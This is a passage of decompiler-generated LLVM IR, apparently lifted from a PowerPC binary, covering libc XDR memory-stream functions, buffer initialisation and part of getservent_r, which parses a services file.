  %v3_100249b0 = inttoptr i32 %v2_100249b0 to i32*
  store i32 %arg2, i32* %v3_100249b0, align 4
  %v2_100249b4 = add i32 %tmp, 16
  %v3_100249b4 = inttoptr i32 %v2_100249b4 to i32*
  store i32 %arg2, i32* %v3_100249b4, align 4
  ret i32 %tmp

; uselistorder directives
  uselistorder i32 %tmp, { 3, 0, 2, 1, 4 }
}

define i32 @xdrmem_destroy() local_unnamed_addr {
entry:
  %v0_100249bc = load i32, i32* @r3, align 4
  ret i32 %v0_100249bc
}

define i32 @xdrmem_getlong(i32 %arg1, i32* %arg2) local_unnamed_addr {
entry:
  %r11.global-to-local = alloca i32, align 4
  %r9.global-to-local = alloca i32, align 4
  %v1_100249c0 = add i32 %arg1, 20
  %v2_100249c0 = inttoptr i32 %v1_100249c0 to i32*
  %v3_100249c0 = load i32, i32* %v2_100249c0, align 4
  store i32 %v3_100249c0, i32* %r9.global-to-local, align 4
  store i32 0, i32* %r11.global-to-local, align 4
  %tmp2 = icmp ult i32 %v3_100249c0, 4
  br i1 %tmp2, label %dec_label_pc_100249f4, label %dec_label_pc_100249d4

dec_label_pc_100249d4:                            ; preds = %entry
  %v1_100249cc = add i32 %v3_100249c0, -4
  %v1_100249d4 = add i32 %arg1, 12
  %v2_100249d4 = inttoptr i32 %v1_100249d4 to i32*
  %v3_100249d4 = load i32, i32* %v2_100249d4, align 4
  store i32 %v3_100249d4, i32* %r9.global-to-local, align 4
  store i32 1, i32* %r11.global-to-local, align 4
  store i32 %v1_100249cc, i32* %v2_100249c0, align 4
  %v0_100249e0 = load i32, i32* %r9.global-to-local, align 4
  %v1_100249e0 = inttoptr i32 %v0_100249e0 to i32*
  %v2_100249e0 = load i32, i32* %v1_100249e0, align 4
  store i32 %v2_100249e0, i32* %arg2, align 4
  %v3_100249e8 = load i32, i32* %v2_100249d4, align 4
  %v1_100249ec = add i32 %v3_100249e8, 4
  store i32 %v1_100249ec, i32* %r9.global-to-local, align 4
  store i32 %v1_100249ec, i32* %v2_100249d4, align 4
  %v0_100249f4.pre = load i32, i32* %r11.global-to-local, align 4
  br label %dec_label_pc_100249f4

dec_label_pc_100249f4:                            ; preds = %entry, %dec_label_pc_100249d4
  %v0_100249f4 = phi i32 [ 0, %entry ], [ %v0_100249f4.pre, %dec_label_pc_100249d4 ]
  ret i32 %v0_100249f4

; uselistorder directives
  uselistorder i32* %v2_100249d4, { 1, 0, 2 }
  uselistorder label %dec_label_pc_100249f4, { 1, 0 }
}

define i32 @xdrmem_putlong(i32 %arg1, i32* %arg2) local_unnamed_addr {
entry:
  %r11.global-to-local = alloca i32, align 4
  %v1_100249fc = add i32 %arg1, 20
  %v2_100249fc = inttoptr i32 %v1_100249fc to i32*
  %v3_100249fc = load i32, i32* %v2_100249fc, align 4
  store i32 0, i32* %r11.global-to-local, align 4
  %tmp2 = icmp ult i32 %v3_100249fc, 4
  br i1 %tmp2, label %dec_label_pc_10024a30, label %dec_label_pc_10024a10

dec_label_pc_10024a10:                            ; preds = %entry
  %v1_10024a08 = add i32 %v3_100249fc, -4
  store i32 %v1_10024a08, i32* %v2_100249fc, align 4
  store i32 1, i32* %r11.global-to-local, align 4
  %v1_10024a18 = add i32 %arg1, 12
  %v2_10024a18 = inttoptr i32 %v1_10024a18 to i32*
  %v3_10024a18 = load i32, i32* %v2_10024a18, align 4
  %v2_10024a1c = load i32, i32* %arg2, align 4
  %v2_10024a20 = inttoptr i32 %v3_10024a18 to i32*
  store i32 %v2_10024a1c, i32* %v2_10024a20, align 4
  %v3_10024a24 = load i32, i32* %v2_10024a18, align 4
  %v1_10024a28 = add i32 %v3_10024a24, 4
  store i32 %v1_10024a28, i32* %v2_10024a18, align 4
  %v0_10024a30.pre = load i32, i32* %r11.global-to-local, align 4
  br label %dec_label_pc_10024a30

dec_label_pc_10024a30:                            ; preds = %entry, %dec_label_pc_10024a10
  %v0_10024a30 = phi i32 [ 0, %entry ], [ %v0_10024a30.pre, %dec_label_pc_10024a10 ]
  ret i32 %v0_10024a30

; uselistorder directives
  uselistorder i32* %v2_10024a18, { 1, 0, 2 }
  uselistorder label %dec_label_pc_10024a30, { 1, 0 }
}

define i32 @xdrmem_getpos(i32 %arg1) local_unnamed_addr {
entry:
  %v1_10024a38 = add i32 %arg1, 16
  %v2_10024a38 = inttoptr i32 %v1_10024a38 to i32*
  %v3_10024a38 = load i32, i32* %v2_10024a38, align 4
  %v1_10024a3c = add i32 %arg1, 12
  %v2_10024a3c = inttoptr i32 %v1_10024a3c to i32*
  %v3_10024a3c = load i32, i32* %v2_10024a3c, align 4
  %v2_10024a40 = sub i32 %v3_10024a3c, %v3_10024a38
  ret i32 %v2_10024a40
}

define i32 @xdrmem_setpos(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %r4.global-to-local = alloca i32, align 4
  %r9.global-to-local = alloca i32, align 4
  store i32 %arg2, i32* %r4.global-to-local, align 4
  %v1_10024a48 = add i32 %arg1, 20
  %v2_10024a48 = inttoptr i32 %v1_10024a48 to i32*
  %v3_10024a48 = load i32, i32* %v2_10024a48, align 4
  store i32 %v3_10024a48, i32* %r9.global-to-local, align 4
  %v1_10024a4c = add i32 %arg1, 12
  %v2_10024a4c = inttoptr i32 %v1_10024a4c to i32*
  %v3_10024a4c = load i32, i32* %v2_10024a4c, align 4
  %v1_10024a50 = add i32 %arg1, 16
  %v2_10024a50 = inttoptr i32 %v1_10024a50 to i32*
  %v3_10024a50 = load i32, i32* %v2_10024a50, align 4
  %v2_10024a54 = add i32 %v3_10024a4c, %v3_10024a48
  store i32 0, i32* %r9.global-to-local, align 4
  %v2_10024a5c = add i32 %v3_10024a50, %arg2
  store i32 %v2_10024a5c, i32* %r4.global-to-local, align 4
  %v3_10024a60 = icmp slt i32 %v2_10024a54, %v2_10024a5c
  br i1 %v3_10024a60, label %dec_label_pc_10024a78, label %dec_label_pc_10024a6c

dec_label_pc_10024a6c:                            ; preds = %entry
  %v2_10024a64 = sub i32 %v2_10024a54, %v2_10024a5c
  store i32 %v2_10024a64, i32* %v2_10024a48, align 4
  store i32 1, i32* %r9.global-to-local, align 4
  %v0_10024a74 = load i32, i32* %r4.global-to-local, align 4
  store i32 %v0_10024a74, i32* %v2_10024a4c, align 4
  %v0_10024a78.pre = load i32, i32* %r9.global-to-local, align 4
  br label %dec_label_pc_10024a78

dec_label_pc_10024a78:                            ; preds = %entry, %dec_label_pc_10024a6c
  %v0_10024a78 = phi i32 [ 0, %entry ], [ %v0_10024a78.pre, %dec_label_pc_10024a6c ]
  ret i32 %v0_10024a78

; uselistorder directives
  uselistorder i32 %v2_10024a5c, { 1, 0, 2 }
  uselistorder i32 %v2_10024a54, { 1, 0 }
  uselistorder i32* %r4.global-to-local, { 1, 2, 0 }
  uselistorder label %dec_label_pc_10024a78, { 1, 0 }
}

define i32 @xdrmem_inline(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %r9.global-to-local = alloca i32, align 4
  %v1_10024a80 = add i32 %arg1, 20
  %v2_10024a80 = inttoptr i32 %v1_10024a80 to i32*
  %v3_10024a80 = load i32, i32* %v2_10024a80, align 4
  store i32 0, i32* %r9.global-to-local, align 4
  %v2_10024a88 = icmp ult i32 %v3_10024a80, %arg2
  br i1 %v2_10024a88, label %dec_label_pc_10024aa4, label %dec_label_pc_10024a94

dec_label_pc_10024a94:                            ; preds = %entry
  %v2_10024a8c = sub i32 %v3_10024a80, %arg2
  %v1_10024a94 = add i32 %arg1, 12
  %v2_10024a94 = inttoptr i32 %v1_10024a94 to i32*
  %v3_10024a94 = load i32, i32* %v2_10024a94, align 4
  store i32 %v3_10024a94, i32* %r9.global-to-local, align 4
  store i32 %v2_10024a8c, i32* %v2_10024a80, align 4
  %v0_10024a9c = load i32, i32* %r9.global-to-local, align 4
  %v2_10024a9c = add i32 %v0_10024a9c, %arg2
  store i32 %v2_10024a9c, i32* %v2_10024a94, align 4
  %v0_10024aa4.pre = load i32, i32* %r9.global-to-local, align 4
  br label %dec_label_pc_10024aa4

dec_label_pc_10024aa4:                            ; preds = %entry, %dec_label_pc_10024a94
  %v0_10024aa4 = phi i32 [ 0, %entry ], [ %v0_10024aa4.pre, %dec_label_pc_10024a94 ]
  ret i32 %v0_10024aa4

; uselistorder directives
  uselistorder i32* %r9.global-to-local, { 1, 0, 2, 3 }
  uselistorder i32 %arg2, { 0, 2, 1 }
  uselistorder label %dec_label_pc_10024aa4, { 1, 0 }
}

define i32 @xdrmem_getint32(i32 %arg1, i32* %arg2) local_unnamed_addr {
entry:
  %r11.global-to-local = alloca i32, align 4
  %r9.global-to-local = alloca i32, align 4
  %v1_10024aac = add i32 %arg1, 20
  %v2_10024aac = inttoptr i32 %v1_10024aac to i32*
  %v3_10024aac = load i32, i32* %v2_10024aac, align 4
  store i32 %v3_10024aac, i32* %r9.global-to-local, align 4
  store i32 0, i32* %r11.global-to-local, align 4
  %tmp2 = icmp ult i32 %v3_10024aac, 4
  br i1 %tmp2, label %dec_label_pc_10024ae0, label %dec_label_pc_10024ac0

dec_label_pc_10024ac0:                            ; preds = %entry
  %v1_10024ab8 = add i32 %v3_10024aac, -4
  %v1_10024ac0 = add i32 %arg1, 12
  %v2_10024ac0 = inttoptr i32 %v1_10024ac0 to i32*
  %v3_10024ac0 = load i32, i32* %v2_10024ac0, align 4
  store i32 %v3_10024ac0, i32* %r9.global-to-local, align 4
  store i32 1, i32* %r11.global-to-local, align 4
  store i32 %v1_10024ab8, i32* %v2_10024aac, align 4
  %v0_10024acc = load i32, i32* %r9.global-to-local, align 4
  %v1_10024acc = inttoptr i32 %v0_10024acc to i32*
  %v2_10024acc = load i32, i32* %v1_10024acc, align 4
  store i32 %v2_10024acc, i32* %arg2, align 4
  %v3_10024ad4 = load i32, i32* %v2_10024ac0, align 4
  %v1_10024ad8 = add i32 %v3_10024ad4, 4
  store i32 %v1_10024ad8, i32* %r9.global-to-local, align 4
  store i32 %v1_10024ad8, i32* %v2_10024ac0, align 4
  %v0_10024ae0.pre = load i32, i32* %r11.global-to-local, align 4
  br label %dec_label_pc_10024ae0

dec_label_pc_10024ae0:                            ; preds = %entry, %dec_label_pc_10024ac0
  %v0_10024ae0 = phi i32 [ 0, %entry ], [ %v0_10024ae0.pre, %dec_label_pc_10024ac0 ]
  ret i32 %v0_10024ae0

; uselistorder directives
  uselistorder i32* %v2_10024ac0, { 1, 0, 2 }
  uselistorder label %dec_label_pc_10024ae0, { 1, 0 }
}

define i32 @xdrmem_putint32(i32 %arg1, i32* %arg2) local_unnamed_addr {
entry:
  %r11.global-to-local = alloca i32, align 4
  %v1_10024ae8 = add i32 %arg1, 20
  %v2_10024ae8 = inttoptr i32 %v1_10024ae8 to i32*
  %v3_10024ae8 = load i32, i32* %v2_10024ae8, align 4
  store i32 0, i32* %r11.global-to-local, align 4
  %tmp2 = icmp ult i32 %v3_10024ae8, 4
  br i1 %tmp2, label %dec_label_pc_10024b1c, label %dec_label_pc_10024afc

dec_label_pc_10024afc:                            ; preds = %entry
  %v1_10024af4 = add i32 %v3_10024ae8, -4
  store i32 %v1_10024af4, i32* %v2_10024ae8, align 4
  store i32 1, i32* %r11.global-to-local, align 4
  %v1_10024b04 = add i32 %arg1, 12
  %v2_10024b04 = inttoptr i32 %v1_10024b04 to i32*
  %v3_10024b04 = load i32, i32* %v2_10024b04, align 4
  %v2_10024b08 = load i32, i32* %arg2, align 4
  %v2_10024b0c = inttoptr i32 %v3_10024b04 to i32*
  store i32 %v2_10024b08, i32* %v2_10024b0c, align 4
  %v3_10024b10 = load i32, i32* %v2_10024b04, align 4
  %v1_10024b14 = add i32 %v3_10024b10, 4
  store i32 %v1_10024b14, i32* %v2_10024b04, align 4
  %v0_10024b1c.pre = load i32, i32* %r11.global-to-local, align 4
  br label %dec_label_pc_10024b1c

dec_label_pc_10024b1c:                            ; preds = %entry, %dec_label_pc_10024afc
  %v0_10024b1c = phi i32 [ 0, %entry ], [ %v0_10024b1c.pre, %dec_label_pc_10024afc ]
  ret i32 %v0_10024b1c

; uselistorder directives
  uselistorder i32* %v2_10024b04, { 1, 0, 2 }
  uselistorder label %dec_label_pc_10024b1c, { 1, 0 }
}

define i32 @xdrmem_putbytes(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %r3.global-to-local = alloca i32, align 4
  %r30.global-to-local = alloca i32, align 4
  %r31.global-to-local = alloca i32, align 4
  store i32 %arg2, i32* @r5, align 4
  store i32 %arg1, i32* %r3.global-to-local, align 4
  store i32 %arg1, i32* %r31.global-to-local, align 4
  store i32 %arg2, i32* %r30.global-to-local, align 4
  %v1_10024b3c = add i32 %arg1, 20
  %v2_10024b3c = inttoptr i32 %v1_10024b3c to i32*
  %v3_10024b3c = load i32, i32* %v2_10024b3c, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  %v2_10024b44 = icmp ult i32 %v3_10024b3c, %arg2
  br i1 %v2_10024b44, label %dec_label_pc_10024b6c, label %dec_label_pc_10024b50

dec_label_pc_10024b50:                            ; preds = %entry
  %v2_10024b48 = sub i32 %v3_10024b3c, %arg2
  store i32 %v2_10024b48, i32* %v2_10024b3c, align 4
  %v0_10024b54 = load i32, i32* %r31.global-to-local, align 4
  %v1_10024b54 = add i32 %v0_10024b54, 12
  %v2_10024b54 = inttoptr i32 %v1_10024b54 to i32*
  %v3_10024b54 = load i32, i32* %v2_10024b54, align 4
  store i32 %v3_10024b54, i32* @r3, align 4
  store i32 268585820, i32* @lr, align 4
  %v0_10024b58 = call i32 @memcpy()
  store i32 %v0_10024b58, i32* %r3.global-to-local, align 4
  %v0_10024b5c = load i32, i32* %r31.global-to-local, align 4
  %v1_10024b5c = add i32 %v0_10024b5c, 12
  %v2_10024b5c = inttoptr i32 %v1_10024b5c to i32*
  %v3_10024b5c = load i32, i32* %v2_10024b5c, align 4
  store i32 1, i32* %r3.global-to-local, align 4
  %v1_10024b64 = load i32, i32* %r30.global-to-local, align 4
  %v2_10024b64 = add i32 %v1_10024b64, %v3_10024b5c
  store i32 %v2_10024b64, i32* %v2_10024b5c, align 4
  %v0_10024b7c.pre = load i32, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_10024b6c

dec_label_pc_10024b6c:                            ; preds = %entry, %dec_label_pc_10024b50
  %v0_10024b7c = phi i32 [ 0, %entry ], [ %v0_10024b7c.pre, %dec_label_pc_10024b50 ]
  ret i32 %v0_10024b7c

; uselistorder directives
  uselistorder i32* %r3.global-to-local, { 1, 2, 3, 4, 0 }
  uselistorder i32 %arg2, { 0, 2, 1, 3 }
  uselistorder i32 %arg1, { 1, 0, 2 }
  uselistorder label %dec_label_pc_10024b6c, { 1, 0 }
}

define i32 @xdrmem_getbytes(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %r11.global-to-local = alloca i32, align 4
  %r30.global-to-local = alloca i32, align 4
  %r31.global-to-local = alloca i32, align 4
  store i32 %arg3, i32* @r5, align 4
  store i32 0, i32* %r11.global-to-local, align 4
  store i32 %arg1, i32* %r31.global-to-local, align 4
  store i32 %arg3, i32* %r30.global-to-local, align 4
  %v1_10024b9c = add i32 %arg1, 20
  %v2_10024b9c = inttoptr i32 %v1_10024b9c to i32*
  %v3_10024b9c = load i32, i32* %v2_10024b9c, align 4
  store i32 %arg2, i32* @r3, align 4
  %v2_10024ba4 = icmp ult i32 %v3_10024b9c, %arg3
  br i1 %v2_10024ba4, label %dec_label_pc_10024bcc, label %dec_label_pc_10024bb0

dec_label_pc_10024bb0:                            ; preds = %entry
  %v2_10024ba8 = sub i32 %v3_10024b9c, %arg3
  store i32 %v2_10024ba8, i32* %v2_10024b9c, align 4
  %v0_10024bb4 = load i32, i32* %r31.global-to-local, align 4
  %v1_10024bb4 = add i32 %v0_10024bb4, 12
  %v2_10024bb4 = inttoptr i32 %v1_10024bb4 to i32*
  %v3_10024bb4 = load i32, i32* %v2_10024bb4, align 4
  store i32 %v3_10024bb4, i32* @r4, align 4
  store i32 268585916, i32* @lr, align 4
  %v0_10024bb8 = call i32 @memcpy()
  %v0_10024bbc = load i32, i32* %r31.global-to-local, align 4
  %v1_10024bbc = add i32 %v0_10024bbc, 12
  %v2_10024bbc = inttoptr i32 %v1_10024bbc to i32*
  %v3_10024bbc = load i32, i32* %v2_10024bbc, align 4
  store i32 1, i32* %r11.global-to-local, align 4
  %v1_10024bc4 = load i32, i32* %r30.global-to-local, align 4
  %v2_10024bc4 = add i32 %v1_10024bc4, %v3_10024bbc
  store i32 %v2_10024bc4, i32* %v2_10024bbc, align 4
  %v0_10024bd0.pre = load i32, i32* %r11.global-to-local, align 4
  br label %dec_label_pc_10024bcc

dec_label_pc_10024bcc:                            ; preds = %entry, %dec_label_pc_10024bb0
  %v0_10024bd0 = phi i32 [ 0, %entry ], [ %v0_10024bd0.pre, %dec_label_pc_10024bb0 ]
  ret i32 %v0_10024bd0

; uselistorder directives
  uselistorder i32 %arg3, { 0, 2, 1, 3 }
  uselistorder i32 %arg1, { 1, 0 }
  uselistorder label %dec_label_pc_10024bcc, { 1, 0 }
}

define i32 @__initbuf() local_unnamed_addr {
entry:
  %v3_10024bf8 = load i32, i32* @global_var_1004527c.1341, align 4
  %v3_10024bfc = icmp eq i32 %v3_10024bf8, 0
  br i1 %v3_10024bfc, label %dec_label_pc_10024c04, label %entry.dec_label_pc_10024c1c_crit_edge

entry.dec_label_pc_10024c1c_crit_edge:            ; preds = %entry
  %v0_10024c2c.pre = load i32, i32* @r3, align 4
  br label %dec_label_pc_10024c1c

dec_label_pc_10024c04:                            ; preds = %entry
  store i32 4237, i32* @r3, align 4
  store i32 268585996, i32* @lr, align 4
  %v0_10024c08 = call i32 @malloc()
  %v3_10024c0c = icmp eq i32 %v0_10024c08, 0
  store i32 %v0_10024c08, i32* @global_var_1004527c.1341, align 4
  br i1 %v3_10024c0c, label %dec_label_pc_10024c18, label %dec_label_pc_10024c1c

dec_label_pc_10024c18:                            ; preds = %dec_label_pc_10024c04
  %v1_10024c18 = call i32 @abort(i32 0)
  br label %dec_label_pc_10024c1c

dec_label_pc_10024c1c:                            ; preds = %entry.dec_label_pc_10024c1c_crit_edge, %dec_label_pc_10024c04, %dec_label_pc_10024c18
  %v0_10024c2c = phi i32 [ %v0_10024c2c.pre, %entry.dec_label_pc_10024c1c_crit_edge ], [ %v0_10024c08, %dec_label_pc_10024c04 ], [ %v1_10024c18, %dec_label_pc_10024c18 ]
  ret i32 %v0_10024c2c

; uselistorder directives
  uselistorder i32 (i32)* @abort, { 1, 0 }
  uselistorder label %dec_label_pc_10024c1c, { 2, 1, 0 }
}

define i32 @getservent_r(i32* %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %r29.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r31.global-to-local = alloca i32, align 4
  %r9.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i32* %arg1 to i32
  store i32 %tmp, i32* %r3.global-to-local, align 4
  %stack_var_-40 = alloca i32, align 4
  %v2_10024c34 = icmp ugt i32 %arg3, 139
  store i32 %arg3, i32* %r31.global-to-local, align 4
  store i32 %arg4, i32* @r26, align 4
  %v2_10024c50 = inttoptr i32 %arg4 to i32*
  store i32 0, i32* %v2_10024c50, align 4
  store i32 %tmp, i32* @r30, align 4
  store i32 %arg2, i32* @r28, align 4
  br i1 %v2_10024c34, label %dec_label_pc_10024c74, label %dec_label_pc_10024c60

dec_label_pc_10024c60:                            ; preds = %entry
  %v0_10024c60 = call i32 @__errno_location()
  store i32 %v0_10024c60, i32* %r3.global-to-local, align 4
  store i32 34, i32* @r31, align 4
  %v2_10024c6c = inttoptr i32 %v0_10024c60 to i32*
  store i32 34, i32* %v2_10024c6c, align 4
  br label %dec_label_pc_10024e58

dec_label_pc_10024c74:                            ; preds = %entry
  store i32 ptrtoint (i32* @global_var_1004506c.1342 to i32), i32* @r29, align 4
  %v2_10024c88 = ptrtoint i32* %stack_var_-40 to i32
  store i32 %v2_10024c88, i32* %r3.global-to-local, align 4
  %v4_10024c8c = call i32 @__pthread_cleanup_push_defer(i32* nonnull %stack_var_-40, i32 add (i32 ptrtoint (i32* @global_var_10010000.20 to i32), i32 26856), i32 ptrtoint (i32* @global_var_1004506c.1342 to i32))
  %v0_10024c90 = load i32, i32* @r29, align 4
  store i32 %v0_10024c90, i32* %r3.global-to-local, align 4
  store i32 268586136, i32* @lr, align 4
  %v1_10024c94 = call i32 @pthread_mutex_lock(i32 %v0_10024c90)
  store i32 %v1_10024c94, i32* %r3.global-to-local, align 4
  %v0_10024c98 = load i32, i32* @r31, align 4
  %v1_10024c98 = add i32 %v0_10024c98, -140
  %v2_10024c9c = icmp ugt i32 %v1_10024c98, 4096
  %v0_10024ca0 = load i32, i32* @r28, align 4
  %v1_10024ca0 = add i32 %v0_10024ca0, 140
  store i32 %v1_10024ca0, i32* @r27, align 4
  br i1 %v2_10024c9c, label %dec_label_pc_10024cb8, label %dec_label_pc_10024ca8

dec_label_pc_10024ca8:                            ; preds = %dec_label_pc_10024c74
  %v0_10024ca8 = call i32 @__errno_location()
  br label %dec_label_pc_10024cf4

dec_label_pc_10024cb8:                            ; preds = %dec_label_pc_10024c74
  store i32 268697600, i32* %r31.global-to-local, align 4
  %v3_10024cbc = load i32, i32* @global_var_10045280.1343, align 4
  %v3_10024cc0 = icmp eq i32 %v3_10024cbc, 0
  br i1 %v3_10024cc0, label %dec_label_pc_10024cc8, label %dec_label_pc_10024cfc.preheader

dec_label_pc_10024cc8:                            ; preds = %dec_label_pc_10024cb8
  store i32 ptrtoint ([14 x i8]* @global_var_1002fb18.1344 to i32), i32* %r3.global-to-local, align 4
  store i32 268586204, i32* @lr, align 4
  %v3_10024cd8 = call i32 @__GI_fopen(i32 ptrtoint ([14 x i8]* @global_var_1002fb18.1344 to i32), i32 ptrtoint (i32* @global_var_1002fb28.1345 to i32))
  store i32 %v3_10024cd8, i32* %r3.global-to-local, align 4
  %v3_10024cdc = icmp eq i32 %v3_10024cd8, 0
  store i32 %v3_10024cd8, i32* @global_var_10045280.1343, align 4
  br i1 %v3_10024cdc, label %dec_label_pc_10024ce8, label %dec_label_pc_10024cc8.dec_label_pc_10024cfc.preheader_crit_edge

dec_label_pc_10024cc8.dec_label_pc_10024cfc.preheader_crit_edge: ; preds = %dec_label_pc_10024cc8
  %v0_10024d0012.pre = load i32, i32* @r27, align 4
  br label %dec_label_pc_10024cfc.preheader

dec_label_pc_10024cfc.preheader:                  ; preds = %dec_label_pc_10024cc8.dec_label_pc_10024cfc.preheader_crit_edge, %dec_label_pc_10024cb8
  %v0_10024d0012 = phi i32 [ %v0_10024d0012.pre, %dec_label_pc_10024cc8.dec_label_pc_10024cfc.preheader_crit_edge ], [ %v1_10024ca0, %dec_label_pc_10024cb8 ]
  %v3_10024d04.ph = phi i32 [ %v3_10024cd8, %dec_label_pc_10024cc8.dec_label_pc_10024cfc.preheader_crit_edge ], [ %v3_10024cbc, %dec_label_pc_10024cb8 ]
  store i32 268697600, i32* %r9.global-to-local, align 4
  store i32 %v0_10024d0012, i32* %r3.global-to-local, align 4
  store i32 268586256, i32* @lr, align 4
  %v3_10024d0c13 = call i32 @fgets(i32 %v0_10024d0012, i32 4096, i32 %v3_10024d04.ph)
  store i32 %v3_10024d0c13, i32* @r3, align 4
  store i32 %v3_10024d0c13, i32* %r31.global-to-local, align 4
  %v4_10024d1014 = icmp eq i32 %v3_10024d0c13, 0
  br i1 %v4_10024d1014, label %dec_label_pc_10024ce8, label %dec_label_pc_10024d18

dec_label_pc_10024ce8:                            ; preds = %dec_label_pc_10024cfc.preheader, %dec_label_pc_10024cfc.backedge, %dec_label_pc_10024cc8
  %v0_10024ce8 = call i32 @__errno_location()
  br label %dec_label_pc_10024cf4

dec_label_pc_10024cf4:                            ; preds = %dec_label_pc_10024ca8, %dec_label_pc_10024ce8
  %storemerge2 = phi i32 [ %v0_10024ca8, %dec_label_pc_10024ca8 ], [ %v0_10024ce8, %dec_label_pc_10024ce8 ]
  %storemerge1 = phi i32 [ 34, %dec_label_pc_10024ca8 ], [ 5, %dec_label_pc_10024ce8 ]
  store i32 %storemerge2, i32* %r3.global-to-local, align 4
  store i32 %storemerge1, i32* %r31.global-to-local, align 4
  %v2_10024cf4 = inttoptr i32 %storemerge2 to i32*
  store i32 %storemerge1, i32* %v2_10024cf4, align 4
  br label %dec_label_pc_10024e4c

dec_label_pc_10024d18:                            ; preds = %dec_label_pc_10024cfc.preheader, %dec_label_pc_10024cfc.backedge
  %v3_10024d0c15 = phi i32 [ %v3_10024d0c, %dec_label_pc_10024cfc.backedge ], [ %v3_10024d0c13, %dec_label_pc_10024cfc.preheader ]
  %v1_10024d18 = inttoptr i32 %v3_10024d0c15 to i8*
  %v2_10024d18 = load i8, i8* %v1_10024d18, align 1
  %v3_10024d1c = icmp eq i8 %v2_10024d18, 35
  br i1 %v3_10024d1c, label %dec_label_pc_10024cfc.backedge, label %dec_label_pc_10024d24

dec_label_pc_10024cfc.backedge:                   ; preds = %dec_label_pc_10024d18, %dec_label_pc_10024d24, %dec_label_pc_10024d38, %dec_label_pc_10024d80
  %v3_10024d04.pre = load i32, i32* @global_var_10045280.1343, align 4
  store i32 268697600, i32* %r9.global-to-local, align 4
  %v0_10024d00 = load i32, i32* @r27, align 4
  store i32 %v0_10024d00, i32* %r3.global-to-local, align 4
  store i32 268586256, i32* @lr, align 4
  %v3_10024d0c = call i32 @fgets(i32 %v0_10024d00, i32 4096, i32 %v3_10024d04.pre)
  store i32 %v3_10024d0c, i32* @r3, align 4
  store i32 %v3_10024d0c, i32* %r31.global-to-local, align 4
  %v4_10024d10 = icmp eq i32 %v3_10024d0c, 0
  br i1 %v4_10024d10, label %dec_label_pc_10024ce8, label %dec_label_pc_10024d18

dec_label_pc_10024d24:                            ; preds = %dec_label_pc_10024d18
  store i32 ptrtoint ([3 x i8]* @global_var_1002fb2c.1346 to i32), i32* @r4, align 4
  store i32 268586288, i32* @lr, align 4
  %v0_10024d2c = call i32 @__GI_strpbrk()
  store i32 %v0_10024d2c, i32* %r3.global-to-local, align 4
  %v4_10024d30 = icmp eq i32 %v0_10024d2c, 0
  br i1 %v4_10024d30, label %dec_label_pc_10024cfc.backedge, label %dec_label_pc_10024d38

dec_label_pc_10024d38:                            ; preds = %dec_label_pc_10024d24
  %v1_10024d2c = inttoptr i32 %v0_10024d2c to i8*
  store i32 0, i32* %r29.global-to-local, align 4
  store i8 0, i8* %v1_10024d2c, align 1
  store i32 ptrtoint ([3 x i8]* @global_var_1002fb30.1347 to i32), i32* @r4, align 4
  %v0_10024d48 = load i32, i32* %r31.global-to-local, align 4
  %v1_10024d48 = load i32, i32* @r30, align 4
  %v2_10024d48 = inttoptr i32 %v1_10024d48 to i32*
  store i32 %v0_10024d48, i32* %v2_10024d48, align 4
  %v0_10024d4c = load i32, i32* %r31.global-to-local, align 4
  store i32 %v0_10024d4c, i32* @r3, align 4
  store i32 268586324, i32* @lr, align 4
  %v0_10024d50 = call i32 @__GI_strpbrk()
  store i32 %v0_10024d50, i32* %r3.global-to-local, align 4
  %v4_10024d54 = icmp eq i32 %v0_10024d50, 0
  br i1 %v4_10024d54, label %dec_label_pc_10024cfc.backedge, label %dec_label_pc_10024d5c

dec_label_pc_10024d5c:                            ; preds = %dec_label_pc_10024d38
  %v1_10024d50 = inttoptr i32 %v0_10024d50 to i8*
  %v2_10024d5c = add i32 %v0_10024d50, 1
  store i32 %v2_10024d5c, i32* %r31.global-to-local, align 4
  %v0_10024d60 = load i32, i32* %r29.global-to-local, align 4
  %v1_10024d60 = trunc i32 %v0_10024d60 to i8
  store i8 %v1_10024d60, i8* %v1_10024d50, align 1
  %v0_10024d6c.pre = load i32, i32* %r31.global-to-local, align 4
  br label %dec_label_pc_10024d6c

dec_label_pc_10024d68:                            ; preds = %dec_label_pc_10024d6c, %dec_label_pc_10024d6c
  %v1_10024d68 = add i32 %v0_10024d68, 1
  store i32 %v1_10024d68, i32* %r31.global-to-local, align 4
  br label %dec_label_pc_10024d6c

dec_label_pc_10024d6c:                            ; preds = %dec_label_pc_10024d5c, %dec_label_pc_10024d68
  %v0_10024d68 = phi i32 [ %v0_10024d6c.pre, %dec_label_pc_10024d5c ], [ %v1_10024d68, %dec_label_pc_10024d68 ]
  %v1_10024d6c = inttoptr i32 %v0_10024d68 to i8*
  %v2_10024d6c = load i8, i8* %v1_10024d6c, align 1
  switch i8 %v2_10024d6c, label %dec_label_pc_10024d80 [
    i8 32, label %dec_label_pc_10024d68
    i8 9, label %dec_label_pc_10024d68
  ]

dec_label_pc_10024d80:                            ; preds = %dec_label_pc_10024d6c
  store i32 %v0_10024d68, i32* @r3, align 4
  store i32 ptrtoint ([3 x i8]* @global_var_1002fb34.1348 to i32), i32* @r4, align 4
  store i32 268586384, i32* @lr, align 4
  %v0_10024d8c = call i32 @__GI_strpbrk()
  store i32 %v0_10024d8c, i32* %r3.global-to-local, align 4
  store i32 %v0_10024d8c, i32* %r29.global-to-local, align 4
  %v4_10024d90 = icmp eq i32 %v0_10024d8c, 0
  br i1 %v4_10024d90, label %dec_label_pc_10024cfc.backedge, label %dec_label_pc_10024d98

dec_label_pc_10024d98:                            ; preds = %dec_label_pc_10024d80
  store i32 0, i32* @r27, align 4
  %v0_10024d9c = load i32, i32* %r31.global-to-local, align 4
  store i32 %v0_10024d9c, i32* %r3.global-to-local, align 4
  %v3_10024da0 = inttoptr i32 %v0_10024d8c to i8*
  store i8 0, i8* %v3_10024da0, align 1
  %v0_10024da4 = load i32, i32* %r29.global-to-local, align 4
  %v1_10024da4 = add i32 %v0_10024da4, 1
  store i32 %v1_10024da4, i32* @r29, align 4
